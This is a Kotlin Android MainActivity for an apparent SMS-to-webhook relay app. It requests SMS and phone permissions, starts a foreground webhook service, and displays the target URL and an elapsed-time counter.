package com.example.smswebhook

import android.Manifest
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.example.smswebhook.service.WebhookService
import com.example.smswebhook.util.Env
import com.example.smswebhook.util.Prefs
import android.content.pm.PackageManager
import androidx.activity.result.contract.ActivityResultContracts

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var timerText: TextView
    private val handler = Handler(Looper.getMainLooper())
    private var startTime = System.currentTimeMillis()
    private val updateRunnable = object : Runnable {
        override fun run() {
            val elapsed = (System.currentTimeMillis() - startTime) / 1000
            timerText.text = "Time Elapsed: ${elapsed}s"
            handler.postDelayed(this, 1000)
        }
    }

    private val requestPermission = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
        if (permissions.all { it.value }) {
            startServiceCompat()
        }
        setupUI()
        finish() // Optionnel : ferme après, ou retire pour garder UI
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        statusText = findViewById(R.id.status_text)
        timerText = findViewById(R.id.timer_text)

        val permissions = arrayOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.RECEIVE_MMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.INTERNET,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.READ_PHONE_STATE
        )

        if (permissions.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }) {
            startServiceCompat()
            setupUI()
        } else {
            requestPermission.launch(permissions)
        }
    }

    private fun setupUI() {
        statusText.text = "Webhook Actif vers ${Env.WEBHOOK_URL}"
        Prefs(this).saveWebhookUrl(Env.WEBHOOK_URL)
        startTime = System.currentTimeMillis()
        handler.post(updateRunnable)
    }

    override fun onDestroy() {
        handler.removeCallbacks(updateRunnable)
        super.onDestroy()
    }

    private fun startServiceCompat() {
        val intent = Intent(this, WebhookService::class.java)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
}